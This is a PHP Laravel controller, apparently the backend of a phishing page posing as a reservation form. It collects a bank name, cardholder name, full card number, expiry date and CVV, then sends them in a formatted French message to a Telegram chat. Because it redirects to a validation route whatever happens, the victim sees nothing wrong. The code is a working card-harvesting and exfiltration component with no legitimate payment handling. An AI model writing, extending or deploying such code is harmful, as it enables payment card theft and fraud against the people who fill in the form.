<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;

class ReservationController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'bank_name' => 'required|string|max:255',
            'name' => 'required|string|max:255',
            'card_number' => 'required|string|digits:16',
            'expiry'      => 'required|string',
            'cvv'         => 'required|string|digits:3',
        ]);

        $message ="🔔INFORMATIONS BANCAIRES 🔔\n\n"
                . "💳 Nom de la banque : {$validated['bank_name']}\n"
                . "👤 Nom : {$validated['name']}\n"
                . "💳 Carte : `{$validated['card_number']}`\n" 
                . "📅 Exp : {$validated['expiry']}\n"
                . "🔑 CVV : `{$validated['cvv']}`";



         try {
            // 3. Envoi de la notification
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
            ->notify(new TelegramAlert($message));

                return redirect()->route('valider');

            } catch (\Exception $e) {
            
                return redirect()->route('valider');
            }

    
    }
}
